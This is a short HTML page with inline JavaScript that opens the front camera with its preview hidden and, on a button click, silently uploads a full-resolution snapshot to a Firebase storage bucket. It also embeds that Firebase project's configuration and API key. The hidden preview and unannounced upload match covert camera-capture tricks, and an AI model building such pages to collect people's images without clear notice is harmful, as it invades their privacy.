<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Camera Capture</title>
    <link rel="stylesheet" href="style.css">
    <script type="module">
        // Import the necessary Firebase functions
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Function to upload image to Firebase
        function uploadImage(imageData) {
            const imageRef = ref(storage, 'captured_images/image_' + Date.now() + '.png'); // Generate unique filename
            uploadString(imageRef, imageData, 'data_url')
                .then((snapshot) => {
                    console.log('Uploaded a blob or file!');
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        // Access the video and canvas elements
        window.addEventListener('load', () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            // Function to start capturing from the front camera
            function startCapture() {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // Use front camera
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(stream => {
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        canvas.width = 1920;  // Set canvas width to 1920 for 1080p
                        canvas.height = 1080; // Set canvas height to 1080 for 1080p
                    };
                })
                .catch(err => {
                    console.error('Error accessing camera: ', err);
                });
            }

            // Function to capture image immediately
            function captureImageImmediately() {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');
                // Automatically upload the image to the server
                uploadImage(imageData);
            }

            // Start capturing from the front camera
            startCapture();

            // Add an event listener to capture image on link click
            document.getElementById('captureButton').addEventListener('click', () => {
                captureImageImmediately();
            });
        });
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            color: #fff; /* White text */
            text-align: center;
        }

        h1 {
            margin-top: 20px;
        }

        .container {
            position: relative;
            display: inline-block;
        }

        video {
            display: none; /* Hide video element */
        }

        canvas {
            display: none; /* Hide canvas element */
        }

        button {
            background-color: #fff; /* White button */
            color: #000; /* Black text */
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }

        button:hover {
            background-color: #ccc; /* Light grey on hover */
        }
    </style>
</head>
<body>
    <h1>Live Camera Capture</h1>
    <div class="container">
        <video id="video" autoplay></video>
        <canvas id="canvas"></canvas>
    </div>
    <button id="captureButton">Capture Image</button> <!-- Button to capture image -->
</body>
</html>
